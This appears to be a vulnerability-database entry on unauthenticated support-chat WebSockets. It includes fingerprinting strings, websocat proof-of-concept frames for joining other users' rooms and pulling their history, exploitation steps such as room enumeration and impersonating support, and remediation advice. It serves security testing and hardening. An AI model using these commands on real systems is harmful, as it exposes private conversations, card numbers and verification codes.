---
id: "im-websocket-unauth"
title: "Unauthenticated support IM / WebSocket (subscribe to others' conversations)"
kind: "implementation"
cve: null
related-cves: null
cve-note: "None (implementation flaw)"
severity: "high"
cvss: 8.2
severity-basis: "cvss"
severity-note: null
product: "Custom support system / socket.io / native WS"
versions: "Any"
ports: "80, 443"
keywords: "websocket, socket.io, im, support, unauthenticated, room, subscription"
entry: "Subscribe to room directly via ws://host/ws without a token"
verified: false
verified-on: null
verification-evidence: null
source-url: null
vendor-advisory: null
cwe: null
patch-date: null
sources: "Compiled from public sources (business logic; no CVE)"
kev: null
kev-date: null
kev-source: null
epss: null
epss-percentile: null
epss-date: null
epss-source: null
enrichment-updated: null
---

## Fingerprinting

```
ws://target/ws?token=xxx ws://target/socket.io/?EIO=4&transport=websocket
/socket.io/socket.io.js support domains (kf./service./chat.)
Handshake messages contain {"room":"user_10086"} / {"type":"join"}
```

## Prerequisites

- Ability to connect to WS (browser console or `websocat`); an authorized account.

## PoC

```bash
# 1) Connect without a token and check acceptance
websocat ws://target/ws

# 2) Subscribe to another user's room
websocat -t ws://target/ws
{"action":"join","room":"user_10001"}
{"action":"history","room":"user_10001","limit":50}

# 3) socket.io variant
websocat 'wss://target/socket.io/?EIO=4&transport=websocket'
40{"room":"agent_1"}
```

## Exploitation Steps

1. Capture WS frames for your own conversation and record the `join`/`auth` message format.
2. Remove the token or change `room` to another user's id; check whether chat history is returned/messages can be sent.
3. Success exposes support/member conversations (often including accounts, card numbers, verification codes), and may allow impersonating support to send messages (social-engineering impact).
4. Combine with `member-data-enumeration.md`: enumerate rooms to obtain site-wide conversations.
5. Evidence: one subscription frame + one returned frame (redacted).

## Remediation and Mitigation

### Remediation and Mitigation (Hardening)

- Authenticate during the handshake (validate the token before upgrading); reject anonymous connections;
- Validate room ownership (users may subscribe only to their own room; support subscriptions require a role);
- Rate-limit messages + audit + prevent outward transmission of sensitive terms and verification codes.

## References

- OWASP WebSocket Security Cheat Sheet.
